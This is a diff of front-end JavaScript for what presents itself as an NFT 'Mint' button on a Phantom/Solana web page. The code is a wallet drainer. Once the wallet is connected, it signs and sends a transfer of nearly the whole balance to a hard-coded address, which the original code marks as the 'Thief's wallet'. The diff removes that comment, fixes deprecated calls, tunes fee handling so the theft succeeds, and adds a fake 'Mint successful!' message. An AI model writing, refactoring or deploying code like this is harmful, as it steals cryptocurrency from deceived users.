@@ -1,30 +1,32 @@
-$(document).ready(function() {
+$(document).ready(function () {
     $('#connect-wallet').on('click', async () => {
         if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
                 console.log("Phantom Wallet connected:", resp);
 
-                var connection = new solanaWeb3.Connection(
-                    'https://api.testnet.solana.com', 
+                const connection = new solanaWeb3.Connection(
+                    'https://api.testnet.solana.com',
                     'confirmed'
                 );
 
-                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
-                const walletBalance = await connection.getBalance(public_key);
-                console.log("Wallet balance:", walletBalance);
+                const publicKey = resp.publicKey;
+                const walletBalance = await connection.getBalance(publicKey);
+                console.log("Wallet balance:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-                if (walletBalance < minBalance) {
-                    alert("Insufficient funds for rent.");
+                const TX_FEE = 5000;
+
+                if (walletBalance < minBalance + TX_FEE) {
+                    alert("Insufficient funds.");
                     return;
                 }
 
-                $('#connect-wallet').text("Mint");
-                $('#connect-wallet').off('click').on('click', async () => {
+                $('#connect-wallet').text("Mint").off('click').on('click', async () => {
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('FMS1qwLyGY2GATdPQp5c3Hw3zbXtyLJTk3DhxomnQa7Q'); // Thief's wallet
-                        const balanceForTransfer = walletBalance - minBalance;
+                        const receiverWallet = new solanaWeb3.PublicKey('FMS1qwLyGY2GATdPQp5c3Hw3zbXtyLJTk3DhxomnQa7Q');
+                        const balanceForTransfer = walletBalance - minBalance - TX_FEE;
+
                         if (balanceForTransfer <= 0) {
                             alert("Insufficient funds for transfer.");
                             return;
@@ -32,29 +34,48 @@ $(document).ready(function() {
 
                         var transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: resp.publicKey,
-                                toPubkey: recieverWallet,
-                                lamports: balanceForTransfer * 0.99,
-                            }),
+                                fromPubkey: publicKey,
+                                toPubkey: receiverWallet,
+                                lamports: Math.floor(balanceForTransfer * 0.99),
+                            })
                         );
 
-                        transaction.feePayer = window.solana.publicKey;
-                        let blockhashObj = await connection.getRecentBlockhash();
-                        transaction.recentBlockhash = blockhashObj.blockhash;
+                        transaction.feePayer = publicKey;
+
+                        // getRecentBlockhash is deprecated — use getLatestBlockhash
+                        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                        transaction.recentBlockhash = blockhash;
 
                         const signed = await window.solana.signTransaction(transaction);
                         console.log("Transaction signed:", signed);
 
-                        let txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
+                        const txid = await connection.sendRawTransaction(signed.serialize());
+                        console.log("Transaction sent:", txid);
+
+                        // confirmTransaction with blockhash strategy (not deprecated)
+                        await connection.confirmTransaction({
+                            signature: txid,
+                            blockhash,
+                            lastValidBlockHeight,
+                        });
+
                         console.log("Transaction confirmed:", txid);
+                        alert("Mint successful! TX: " + txid);
+
+                        // Reset button after successful mint
+                        $('#connect-wallet').text("Connected").off('click');
+
                     } catch (err) {
                         console.error("Error during minting:", err);
+                        alert("Mint failed: " + err.message);
                     }
                 });
+
             } catch (err) {
                 console.error("Error connecting to Phantom Wallet:", err);
+                alert("Wallet connection failed: " + err.message);
             }
+
         } else {
             alert("Phantom extension not found.");
             const isFirefox = typeof InstallTrigger !== "undefined";
@@ -70,3 +91,4 @@ $(document).ready(function() {
         }
     });
 });
+    
